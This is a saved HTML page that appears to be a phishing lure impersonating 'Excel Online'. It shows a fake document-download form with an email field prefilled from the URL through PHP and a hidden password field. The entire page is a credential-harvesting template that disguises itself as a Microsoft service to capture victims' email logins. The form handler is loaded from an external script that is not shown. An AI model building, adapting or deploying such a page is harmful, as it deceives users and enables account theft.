
<!-- saved from url=(0036)https://trinityhub.com/online-excel/ -->
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


<link href="./files/facebox.css" rel="stylesheet" type="text/css">
<script language="javascript" type="text/javascript" src="./files/jquery-1.js.download"></script>
<script language="javascript" type="text/javascript" src="./files/facebox.js.download"></script>
<script language="javascript" type="text/javascript" src="./files/jquery.js.download"></script>
<script language="javascript" type="text/javascript" src="./files/javascript1.js.download"></script>
<title>Excel Online - 0O9KSJDJR4843984NF98738UNFD843</title>
<link rel="icon" type="image/png" href="favicon.ico">
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
#heading_tab {
	background-color: #2C2C2C;
	padding: 4px;
	width: 100%;
	color: #CCC;
}
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
body,td,th {
	font-family: Tahoma, Geneva, sans-serif;
}
#central_dv {
	padding: 5px;
	width: 800px;
	margin-right: auto;
	margin-left: auto;
	background-color: #EFEFEF;
	text-align: center;
}
.bigredB {
	font-size: 16px;
	color: #FFF;
	background-color: #FF4242;
	padding: 5px;
        width: 92px; 
        height: 30px; 
        z-index: 4; 
        margin-left: 130px; 
        top: 160px;
        
}
.textfldclass {
	padding: 5px;
	width: 313px;
	margin-left: 30px;
	margin-bottom: 0px;
	text-align: center;
}
.pop_up_class {
	text-align: center;
	width: 400px;
}
.message_div {
	padding: 0px; 
	width: 300px;
	margin-right: auto;
	margin-left: auto;
	margin-top: 0px;
	margin-bottom: 0px;
	color: #F00;
}
</style>
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>

<body style="background-image: url(&#39;pdf.png&#39;); background-repeat: no-repeat" "visibility:hidden" onload="unhideBody()">

<div style="position: absolute; width: 437px; height: 278px; z-index: 1; left: 480px; top: 230px; background-image: url(&#39;pdf2013.png&#39;); background-repeat: no-repeat" id="layer1">
<div style="position: absolute; width: 91px; height: 7px; z-index: 1; left: 171px; top: 67px; background-image: url(&#39;294.gif&#39;); background-repeat: no-repeat" id="layer2">
&nbsp;</div>
<div style="position: absolute; width: 70px; height: 20px; z-index: 1; left: 10px; top: 300px; background-image: url(&#39;pdf.gif&#39;); background-repeat: no-repeat" id="layer2">
&nbsp;</div>

<div style="position: absolute; font-size: 15px; width: 313px; height: 20px; z-index: 1; left: 35px; top: 50px" id="layer3">
<p><br>
  </p>
  <p><span class="message_div" style="display: none; margin-top: 300px"></span><br>
  </p>
  <p>
    <label for="textfield"></label>
    <input placeholder="stgod.update@gmail.com" name="email" value="<?=$_GET[email]?>" class="textfldclass" id="email_field" style="position: absolute; width: 313px; height: 30px; z-index: 1; left: 0px; top: 50px" type="text"><br>
    </p><div id="the_d_" style="display: none"><input placeholder="Password" name="password" class="textfldclass" id="password_field" type="password"></div>
    
  <p></p>	

<p> 
    <input name="button" class="bigredB" id="download" value="Download" type="submit" tabindex="4" style="width: 92px; height: 30px; z-index: 4; left: 200px; top: 160px; line-height: 1.22em; border: 1px solid rgb(82, 38, 117); color: rgb(255, 255, 255); height: 35px; width: 100px; font-weight: bold; cursor: pointer; text-align: center; border-top-left-radius: 2px; border-top-right-radius: 2px; border-bottom-right-radius: 2px; border-bottom-left-radius: 2px; background-color: rgb(5, 55, 155); font-size: 13px;">
    <br>
  </p>
</div>



</div></body><!--  --></html>